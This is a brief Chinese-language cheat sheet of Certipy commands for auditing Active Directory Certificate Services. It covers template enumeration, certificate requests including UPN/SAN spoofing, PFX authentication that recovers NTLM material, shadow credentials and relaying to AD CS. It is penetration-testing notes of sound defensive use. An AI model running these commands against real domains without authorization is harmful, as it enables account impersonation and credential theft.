# Certipy 和 AD CS 常用用法

这篇记录 Certipy 的常用命令。它适合在授权 Active Directory 环境里检查证书服务、模板和可申请情况。

## 枚举

枚举 AD CS。

```bash
certipy find -u USER -p 'PASSWORD' -target dc01.example.local -dc-ip 192.168.1.10
```

导出 JSON。

```bash
certipy find -u USER -p 'PASSWORD' -target dc01.example.local -dc-ip 192.168.1.10 -json
```

查看模板详情。

```bash
certipy find -u USER -p 'PASSWORD' -target dc01.example.local -dc-ip 192.168.1.10 -stdout
```

## 申请证书

申请用户模板。

```bash
certipy req -u USER -p 'PASSWORD' -ca CA -template User -target dc01.example.local
```

申请计算机模板。

```bash
certipy req -u USER -p 'PASSWORD' -ca CA -template Machine -target dc01.example.local
```

指定 SAN。

```bash
certipy req -u USER -p 'PASSWORD' -ca CA -template User -upn user@example.local -target dc01.example.local
```

## 认证和导入

用 PFX 做认证。

```bash
certipy auth -pfx user.pfx
```

用 PFX 导出 NTLM 相关信息。

```bash
certipy auth -pfx user.pfx -dc-ip 192.168.1.10
```

## 其他操作

Shadow 凭据流程。

```bash
certipy shadow auto -u USER -p 'PASSWORD' -dc-ip 192.168.1.10
```

中继到 AD CS。

```bash
certipy relay -target 192.168.1.10 -template Machine
```

## 小记录

AD CS 的排查重点是证书服务是否存在、模板是否可申请、是否允许错误的 EKU 或 SAN。枚举结果记下来，后面和 LDAP、BloodHound 一起对照会比较快。
